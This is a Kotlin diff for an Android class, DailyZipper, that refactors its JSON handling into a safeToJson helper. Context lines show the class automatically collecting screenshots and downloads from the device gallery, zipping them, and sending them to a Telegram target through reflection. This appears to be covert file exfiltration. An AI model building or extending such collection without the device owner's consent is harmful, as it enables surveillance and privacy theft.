@@ -78,6 +78,21 @@ class DailyZipper(
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
             return DailyZipper(context, scanner, telegram)
         }
+
+        // ===== دالة مساعدة آمنة لتحويل أي كائن إلى JSONObject =====
+        private fun safeToJson(obj: Any?): JSONObject? {
+            return try {
+                when (obj) {
+                    is JSONObject -> obj
+                    else -> {
+                        val str = obj?.toString() ?: "{}"
+                        JSONObject(str)
+                    }
+                }
+            } catch (e: Exception) {
+                null
+            }
+        }
     }
 
     init {
@@ -266,7 +281,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام JSONObject فقط
+    //  إرسال الملفات إلى Telegram - باستخدام safeToJson
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,20 +316,8 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // تحويل النتيجة إلى JSONObject بأمان
-                val json = when (result) {
-                    is JSONObject -> result
-                    is Map<*, *> -> {
-                        try {
-                            @Suppress("UNCHECKED_CAST")
-                            JSONObject(result as Map<String, Any?>)
-                        } catch (e: Exception) {
-                            null
-                        }
-                    }
-                    else -> null
-                }
-
+                // تحويل النتيجة إلى JSONObject باستخدام safeToJson
+                val json = safeToJson(result)
                 val success = json?.optBoolean("ok", false) ?: false
 
                 if (success) {
@@ -622,7 +625,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام JSONObject فقط
+    //  التشغيل التلقائي - باستخدام safeToJson
     // ============================================================
 
     fun run(): Boolean {
@@ -643,19 +646,8 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // تحويل العنصر إلى JSONObject بأمان
-                            val json = when (item) {
-                                is JSONObject -> item
-                                is Map<*, *> -> {
-                                    try {
-                                        @Suppress("UNCHECKED_CAST")
-                                        JSONObject(item as Map<String, Any?>)
-                                    } catch (e: Exception) {
-                                        null
-                                    }
-                                }
-                                else -> null
-                            }
+                            // تحويل العنصر إلى JSONObject باستخدام safeToJson
+                            val json = safeToJson(item)
                             val path = json?.optString("path", "") ?: ""
                             if (path.isNotEmpty()) {
                                 val f = File(path)
